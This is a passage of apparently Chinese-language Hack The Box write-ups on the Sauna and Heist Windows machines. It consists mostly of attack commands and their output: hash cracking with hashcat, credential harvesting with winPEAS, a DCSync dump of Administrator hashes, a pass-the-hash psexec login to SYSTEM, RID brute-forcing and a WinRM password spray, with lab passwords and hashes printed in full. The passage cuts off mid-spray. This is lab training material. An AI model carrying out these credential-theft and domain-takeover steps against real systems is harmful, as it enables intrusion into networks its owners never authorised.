Time.Started<span class="token punctuation">..</span><span class="token punctuation">..</span>.: Sat Mar <span class="token number">22</span> <span class="token number">16</span>:45:56 <span class="token number">2025</span> <span class="token punctuation">(</span><span class="token number">2</span> secs<span class="token punctuation">)</span>
Time.Estimated<span class="token punctuation">..</span>.: Sat Mar <span class="token number">22</span> <span class="token number">16</span>:45:58 <span class="token number">2025</span> <span class="token punctuation">(</span><span class="token number">0</span> secs<span class="token punctuation">)</span>
Kernel.Feature<span class="token punctuation">..</span>.: Pure Kernel
Guess.Base<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: File <span class="token punctuation">(</span>/usr/share/wordlists/rockyou.txt<span class="token punctuation">)</span>
Guess.Queue<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">1</span>/1 <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span>
Speed.<span class="token comment">#1.........:  7849.5 kH/s (9.73ms) @ Accel:1024 Loops:1 Thr:32 Vec:1</span>
Recovered<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">1</span>/1 <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span> Digests <span class="token punctuation">(</span>total<span class="token punctuation">)</span>, <span class="token number">1</span>/1 <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span> Digests <span class="token punctuation">(</span>new<span class="token punctuation">)</span>
Progress<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: <span class="token number">10616832</span>/14344385 <span class="token punctuation">(</span><span class="token number">74.01</span>%<span class="token punctuation">)</span>
Rejected<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: <span class="token number">0</span>/10616832 <span class="token punctuation">(</span><span class="token number">0.00</span>%<span class="token punctuation">)</span>
Restore.Point<span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">10420224</span>/14344385 <span class="token punctuation">(</span><span class="token number">72.64</span>%<span class="token punctuation">)</span>
Restore.Sub.<span class="token comment">#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span>
Candidate.Engine.: Device Generator
Candidates.<span class="token comment">#1....: aaron822 -> Saboka54</span>
Hardware.Mon.<span class="token comment">#1..: Temp: 44c Util: 50% Core:1771MHz Mem:3504MHz Bus:8</span>

Started: Sat Mar <span class="token number">22</span> <span class="token number">16</span>:45:43 <span class="token number">2025</span>
Stopped: Sat Mar <span class="token number">22</span> <span class="token number">16</span>:45:59 <span class="token number">2025</span>
</code></pre>

<p>ä½¿ç”¨evil-winrm ç™»å½•ç›®æ ‡</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ evil-winrm <span class="token parameter variable">-i</span> <span class="token number">10.10</span>.10.175 <span class="token parameter variable">-u</span> fsmith  <span class="token parameter variable">-p</span> Thestrokes23 
                                        
Evil-WinRM shell v3.7
<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>                                       
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>FSmith<span class="token punctuation">\</span>Documents<span class="token operator">></span> 
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>FSmith<span class="token punctuation">\</span>desktop<span class="token operator">></span> <span class="token function">dir</span>
    Directory: C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>FSmith<span class="token punctuation">\</span>desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        <span class="token number">3</span>/22/2025   <span class="token number">6</span>:49 AM             <span class="token number">34</span> user.txt
</code></pre>

<h3 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h3><p>ä¸Šä¼ winPEASany.exeå¹¶è¿è¡Œã€‚å¯ä»¥æ‰¾åˆ°å‡­è¯</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>FSmith<span class="token punctuation">\</span>Documents<span class="token operator">></span> .<span class="token punctuation">\</span>winPEASany.exe
ANSI color bit <span class="token keyword">for</span> Windows is not set. If you are executing this from a Windows terminal inside the <span class="token function">host</span> you should run <span class="token string">'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1'</span> and <span class="token keyword">then</span> start a new CMD
Long paths are disabled, so the maximum length of a path supported is <span class="token number">260</span> chars <span class="token punctuation">(</span>this may cause <span class="token boolean">false</span> negatives when looking <span class="token keyword">for</span> files<span class="token punctuation">)</span>. If you are admin, you can <span class="token builtin class-name">enable</span> it with <span class="token string">'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1'</span> and <span class="token keyword">then</span> start a new CMD
<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
Ã‰ÃÃÃÃÃÃÃÃÃÃÂ¹ Looking <span class="token keyword">for</span> AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             <span class="token builtin class-name">:</span>  EGOTISTICALBANK
    DefaultUserName               <span class="token builtin class-name">:</span>  EGOTISTICALBANK<span class="token punctuation">\</span>svc_loanmanager
    DefaultPassword               <span class="token builtin class-name">:</span>  Moneymakestheworldgoround<span class="token operator">!</span>

Ã‰ÃÃÃÃÃÃÃÃÃÃÂ¹ Password Policies
<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span></code></pre>

<p>ä½¿ç”¨Bloodhoundåˆ†æåŸŸä¿¡æ¯</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ bloodhound-python   <span class="token parameter variable">-u</span> fsmith  <span class="token parameter variable">-p</span> Thestrokes23  <span class="token parameter variable">-d</span> EGOTISTICAL-BANK.LOCAL <span class="token parameter variable">-ns</span> <span class="token number">10.10</span>.10.175  <span class="token parameter variable">-c</span> all <span class="token parameter variable">--zip</span>
INFO: BloodHound.py <span class="token keyword">for</span> BloodHound LEGACY <span class="token punctuation">(</span>BloodHound <span class="token number">4.2</span> and <span class="token number">4.3</span><span class="token punctuation">)</span>
INFO: Found AD domain: egotistical-bank.local
INFO: Getting TGT <span class="token keyword">for</span> user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: <span class="token punctuation">[</span>Errno Connection error <span class="token punctuation">(</span>SAUNA.EGOTISTICAL-BANK.LOCAL:88<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>Errno -2<span class="token punctuation">]</span> Name or <span class="token function">service</span> not known
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Found <span class="token number">1</span> domains
INFO: Found <span class="token number">1</span> domains <span class="token keyword">in</span> the forest
INFO: Found <span class="token number">1</span> computers
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Found <span class="token number">7</span> <span class="token function">users</span>
INFO: Found <span class="token number">52</span> <span class="token function">groups</span>
INFO: Found <span class="token number">3</span> gpos
INFO: Found <span class="token number">1</span> ous
INFO: Found <span class="token number">19</span> containers
INFO: Found <span class="token number">0</span> trusts
INFO: Starting computer enumeration with <span class="token number">10</span> workers
INFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Done <span class="token keyword">in</span> 00M 36S
INFO: Compressing output into 20250322171023_bloodhound.zip
</code></pre>

<img src="/Hackthebox/htb/htb-sauna/image-20250322171839977.png" class="" title="Bloodhound">

<h3 id="DCsync-attack"><a href="#DCsync-attack" class="headerlink" title="DCsync attack"></a>DCsync attack</h3><p>ä½¿ç”¨impacket-secretsdump è¿›è¡ŒDCSync attack </p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ impacket-secretsdump  <span class="token string">'EGOTISTICAL-BANK/svc_loanmgr@10.10.10.175'</span>  -just-dc-user Administrator 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Dumping Domain Credentials <span class="token punctuation">(</span>domain<span class="token punctuation">\</span>uid:rid:lmhash:nthash<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Cleaning up<span class="token punctuation">..</span>. 
</code></pre>

<p>ä½¿ç”¨impacket-psexec ç™»å½•ç›®æ ‡ï¼Œè·å¾—ç³»ç»Ÿæƒé™</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ impacket-psexec <span class="token string">'EGOTISTICAL-BANK/Administrator@10.10.10.175'</span> <span class="token parameter variable">-hashes</span> <span class="token string">'aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e'</span> 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Requesting shares on <span class="token number">10.10</span>.10.175<span class="token punctuation">..</span><span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Found writable share ADMIN$
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Uploading <span class="token function">file</span> eVKpxetW.exe
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Opening SVCManager on <span class="token number">10.10</span>.10.175<span class="token punctuation">..</span><span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Creating <span class="token function">service</span> dRDK on <span class="token number">10.10</span>.10.175<span class="token punctuation">..</span><span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting <span class="token function">service</span> dRDK<span class="token punctuation">..</span><span class="token punctuation">..</span>.
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Press <span class="token builtin class-name">help</span> <span class="token keyword">for</span> extra shell commands
Microsoft Windows <span class="token punctuation">[</span>Version <span class="token number">10.0</span>.17763.973<span class="token punctuation">]</span>
<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2018</span> Microsoft Corporation. All rights reserved.

C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system3<span class="token operator"><span class="token file-descriptor important">2</span>></span> <span class="token function">whoami</span>
nt authority<span class="token punctuation">\</span>system
</code></pre>

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">C:\Users\FSmith\Desktop\user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">C:\Users\Administrator\Desktop\root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>ä¿¡æ¯æ”¶é›†</tag>
        <tag>åŸŸæ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Heist</title>
    <url>/Hackthebox/htb/htb-heist/</url>
    <content><![CDATA[<style>.vjkdwmsdnkhu{zoom:50%;}</style><img src="/Hackthebox/htb/htb-heist/131dbaba68b169bd5ff59ac09420b09f.png" class="vjkdwmsdnkhu">

<span id="more"></span>

<table>
<thead>
<tr>
<th>OS</th>
<th>Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Windows</td>
<td>Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.10.149 <span class="token parameter variable">-sC</span> <span class="token parameter variable">-sV</span> -p- <span class="token parameter variable">-T4</span> --min-rate <span class="token number">1000</span>                 
Starting Nmap <span class="token number">7.95</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-03-22 <span class="token number">12</span>:02 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.149
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.11s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65530</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
PORT      STATE SERVICE       VERSION
<span class="token number">80</span>/tcp    <span class="token function">open</span>  http          Microsoft IIS httpd <span class="token number">10.0</span>
<span class="token operator">|</span> http-methods: 
<span class="token operator">|</span>_  Potentially risky methods: TRACE
<span class="token operator">|</span> http-title: Support Login Page
<span class="token operator">|</span>_Requested resource was login.php
<span class="token operator">|</span>_http-server-header: Microsoft-IIS/10.0
<span class="token operator">|</span> http-cookie-flags: 
<span class="token operator">|</span>   /: 
<span class="token operator">|</span>     PHPSESSID: 
<span class="token operator">|</span>_      httponly flag not <span class="token builtin class-name">set</span>
<span class="token number">135</span>/tcp   <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">445</span>/tcp   <span class="token function">open</span>  microsoft-ds?
<span class="token number">5985</span>/tcp  <span class="token function">open</span>  http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-title: Not Found
<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="token number">49669</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
Service Info: OS: Windows<span class="token punctuation">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
<span class="token operator">|</span> smb2-time: 
<span class="token operator">|</span>   date: <span class="token number">2025</span>-03-22T03:46:41
<span class="token operator">|</span>_  start_date: N/A
<span class="token operator">|</span> smb2-security-mode: 
<span class="token operator">|</span>   <span class="token number">3</span>:1:1: 
<span class="token operator">|</span>_    Message signing enabled but not required
<span class="token operator">|</span>_clock-skew: <span class="token parameter variable">-18m26s</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">217.07</span> seconds
</code></pre>

<p>æ·»åŠ æœ¬åœ°åŸŸåè§£æ</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'10.10.10.149  heist.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts </code></pre>

<p>è®¿é—®80 ç«¯å£ï¼Œç‚¹å‡»guestç™»å½•</p>
<img src="/Hackthebox/htb/htb-heist/image-20250322122035954.png" class="" title="ç™»å½•">

<p>ç‚¹å‡»Attachmentï¼Œè·³è½¬åˆ°<code>http://heist.htb/attachments/config.txt</code></p>
<img src="/Hackthebox/htb/htb-heist/image-20250322121508924.png" class="" title="config.txt">

<p>å¯ä»¥è·å–åˆ°ç”¨æˆ·åå’Œå¯†ç hash</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
 synchronization
 bgp log-neighbor-changes
 bgp dampening
 network 192.168.0.0Ã‚ mask 300.255.255.0
 timers bgp 3 9
 redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
 session-timeout 600
 authorization exec SSH
 transport input ssh
</code></pre>

<h3 id="å¯†ç ç ´è§£"><a href="#å¯†ç ç ´è§£" class="headerlink" title="å¯†ç ç ´è§£"></a>å¯†ç ç ´è§£</h3><p>ç ´è§£password7 <code>https://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html</code></p>
<p>ä½¿ç”¨hashid è¯†åˆ«hash ç±»å‹ç„¶åä½¿ç”¨hashcat ç ´è§£</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ hashid <span class="token string">'$1$pdQG$o8nrSzsGXeaduXrjlvKc91'</span>
Analyzing <span class="token string">'$1$pdQG$o8nrSzsGXeaduXrjlvKc91'</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> MD5 Crypt 
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Cisco-IOS<span class="token punctuation">(</span>MD5<span class="token punctuation">)</span> 
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> FreeBSD MD5 </code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash">$ hashcat <span class="token parameter variable">-a</span> <span class="token number">0</span> <span class="token parameter variable">-m</span> <span class="token number">500</span>  <span class="token builtin class-name">hash</span> /usr/share/wordlists/rockyou.txt 
hashcat <span class="token punctuation">(</span>v6.2.6<span class="token punctuation">)</span> starting
<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
<span class="token variable">$1</span><span class="token variable">$pdQG</span><span class="token variable">$o8nrSzsGXeaduXrjlvKc91</span>:stealth1agent              
                                                          
Session<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: hashcat
Status<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: Cracked
Hash.Mode<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">500</span> <span class="token punctuation">(</span>md5crypt, MD5 <span class="token punctuation">(</span>Unix<span class="token punctuation">)</span>, Cisco-IOS <span class="token variable">$1</span>$ <span class="token punctuation">(</span>MD5<span class="token punctuation">))</span>
Hash.Target<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token variable">$1</span><span class="token variable">$pdQG</span><span class="token variable">$o8nrSzsGXeaduXrjlvKc91</span>
Time.Started<span class="token punctuation">..</span><span class="token punctuation">..</span>.: Sat Mar <span class="token number">22</span> <span class="token number">12</span>:30:30 <span class="token number">2025</span> <span class="token punctuation">(</span><span class="token number">13</span> secs<span class="token punctuation">)</span>
Time.Estimated<span class="token punctuation">..</span>.: Sat Mar <span class="token number">22</span> <span class="token number">12</span>:30:43 <span class="token number">2025</span> <span class="token punctuation">(</span><span class="token number">0</span> secs<span class="token punctuation">)</span>
Kernel.Feature<span class="token punctuation">..</span>.: Pure Kernel
Guess.Base<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: File <span class="token punctuation">(</span>/usr/share/wordlists/rockyou.txt<span class="token punctuation">)</span>
Guess.Queue<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">1</span>/1 <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span>
Speed.<span class="token comment">#1.........:   267.4 kH/s (7.34ms) @ Accel:128 Loops:125 Thr:32 Vec:1</span>
Recovered<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">1</span>/1 <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span> Digests <span class="token punctuation">(</span>total<span class="token punctuation">)</span>, <span class="token number">1</span>/1 <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span> Digests <span class="token punctuation">(</span>new<span class="token punctuation">)</span>
Progress<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: <span class="token number">3563520</span>/14344385 <span class="token punctuation">(</span><span class="token number">24.84</span>%<span class="token punctuation">)</span>
Rejected<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: <span class="token number">0</span>/3563520 <span class="token punctuation">(</span><span class="token number">0.00</span>%<span class="token punctuation">)</span>
Restore.Point<span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">3538944</span>/14344385 <span class="token punctuation">(</span><span class="token number">24.67</span>%<span class="token punctuation">)</span>
Restore.Sub.<span class="token comment">#1...: Salt:0 Amplifier:0-1 Iteration:875-1000</span>
Candidate.Engine.: Device Generator
Candidates.<span class="token comment">#1....: stefy06 -> ssrssr1978</span>
Hardware.Mon.<span class="token comment">#1..: Temp: 49c Util: 65% Core:1771MHz Mem:3504MHz Bus:8</span>

Started: Sat Mar <span class="token number">22</span> <span class="token number">12</span>:30:29 <span class="token number">2025</span>
Stopped: Sat Mar <span class="token number">22</span> <span class="token number">12</span>:30:45 <span class="token number">2025</span>
                                                                     </code></pre>

<pre class="language-none"><code class="language-none">rout3r: 0242114B0E143F015F5D1E161713($uperP@ssword)
admin: 02375012182C1A1D751618034F36415408(Q4)sJu\Y8qz*A3?d)
hazardï¼š$1$pdQG$o8nrSzsGXeaduXrjlvKc91(stealth1agent)</code></pre>

<h3 id="æšä¸¾ç”¨æˆ·"><a href="#æšä¸¾ç”¨æˆ·" class="headerlink" title="æšä¸¾ç”¨æˆ·"></a>æšä¸¾ç”¨æˆ·</h3><p>ä½¿ç”¨netexec å’Œå‡­è¯æšä¸¾ç”¨æˆ·</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ netexec smb heist.htb  <span class="token parameter variable">-u</span> <span class="token string">"hazard"</span> <span class="token parameter variable">-p</span> <span class="token string">"stealth1agent"</span> --rid-brute 
SMB         <span class="token number">10.10</span>.10.149    <span class="token number">445</span>    SUPPORTDESK      <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Windows <span class="token number">10</span> / Server <span class="token number">2019</span> Build <span class="token number">17763</span> x64 <span class="token punctuation">(</span>name:SUPPORTDESK<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain:SupportDesk<span class="token punctuation">)</span> <span class="token punctuation">(</span>signing:False<span class="token punctuation">)</span> <span class="token punctuation">(</span>SMBv1:False<span class="token punctuation">)</span>
SMB         <span class="token number">10.10</span>.10.149    <span class="token number">445</span>    SUPPORTDESK      <span class="token punctuation">[</span>+<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>hazard:stealth1agent 
SMB         <span class="token number">10.10</span>.10.149    <span class="token number">445</span>    SUPPORTDESK      <span class="token number">500</span>: SUPPORTDESK<span class="token punctuation">\</span>Administrator <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
SMB         <span class="token number">10.10</span>.10.149    <span class="token number">445</span>    SUPPORTDESK      <span class="token number">501</span>: SUPPORTDESK<span class="token punctuation">\</span>Guest <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
SMB         <span class="token number">10.10</span>.10.149    <span class="token number">445</span>    SUPPORTDESK      <span class="token number">503</span>: SUPPORTDESK<span class="token punctuation">\</span>DefaultAccount <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
SMB         <span class="token number">10.10</span>.10.149    <span class="token number">445</span>    SUPPORTDESK      <span class="token number">504</span>: SUPPORTDESK<span class="token punctuation">\</span>WDAGUtilityAccount <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
SMB         <span class="token number">10.10</span>.10.149    <span class="token number">445</span>    SUPPORTDESK      <span class="token number">513</span>: SUPPORTDESK<span class="token punctuation">\</span>None <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
SMB         <span class="token number">10.10</span>.10.149    <span class="token number">445</span>    SUPPORTDESK      <span class="token number">1008</span>: SUPPORTDESK<span class="token punctuation">\</span>Hazard <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
SMB         <span class="token number">10.10</span>.10.149    <span class="token number">445</span>    SUPPORTDESK      <span class="token number">1009</span>: SUPPORTDESK<span class="token punctuation">\</span>support <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
SMB         <span class="token number">10.10</span>.10.149    <span class="token number">445</span>    SUPPORTDESK      <span class="token number">1012</span>: SUPPORTDESK<span class="token punctuation">\</span>Chase <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
SMB         <span class="token number">10.10</span>.10.149    <span class="token number">445</span>    SUPPORTDESK      <span class="token number">1013</span>: SUPPORTDESK<span class="token punctuation">\</span>Jason <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
</code></pre>

<h3 id="winrm-çˆ†ç ´"><a href="#winrm-çˆ†ç ´" class="headerlink" title="winrm çˆ†ç ´"></a>winrm çˆ†ç ´</h3><p>ç›®æ ‡å¼€æ”¾äº†5985 å°†æ”¶é›†åˆ°çš„æ‰€æœ‰ç”¨æˆ·å’Œå£ä»¤å¯¹winrm è¿›è¡Œçˆ†ç ´</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ netexec winrm heist.htb  <span class="token parameter variable">-u</span> user.txt <span class="token parameter variable">-p</span> pass.txt --continue-on-success 
WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Windows <span class="token number">10</span> / Server <span class="token number">2019</span> Build <span class="token number">17763</span> <span class="token punctuation">(</span>name:SUPPORTDESK<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain:SupportDesk<span class="token punctuation">)</span>
WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>rout3r:<span class="token variable">$uperP</span>@ssword
WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>admin:<span class="token variable">$uperP</span>@ssword
WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>hazard:<span class="token variable">$uperP</span>@ssword
WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>Administrator:<span class="token variable">$uperP</span>@ssword
WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>Chase:<span class="token variable">$uperP</span>@ssword
WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>Jason:<span class="token variable">$uperP</span>@ssword
WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>rout3r:Q4<span class="token punctuation">)</span>sJu<span class="token punctuation">\</span>Y8qz*A3?d
WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>admin:Q4<span class="token punctuation">)</span>sJu<span class="token punctuation">\</span>Y8qz*A3?d
WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>hazard:Q4<span class="token punctuation">)</span>sJu<span class="token punctuation">\</span>Y8qz*A3?d
WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>Administrator:Q4<span class="token punctuation">)</span>sJu<span class="token punctuation">\</span>Y8qz*A3?d
WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>+<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>Chase:Q4<span class="token punctuation">)</span>sJu<span class="token punctuation">\</span>Y8qz*A3?d <span class="token punctuation">(</span>Pwn3d<span class="token operator">!</span><span class="token punctuation">)</span>
WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>Jason:Q4<span class="token punctuation">)</span>sJu<span class="token punctuation">\</span>Y8qz*A3?d
WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>rout3r:stealth1agent
WINRM       <span class="token number">10.10</span>.10.149    <span class="token number">5985</span>   SUPPORTDESK      <span class="token punctuation">[</span>-<span class="token punctuation">]</span> SupportDesk<span class="token punctuation">\</span>admin:stealth1agent
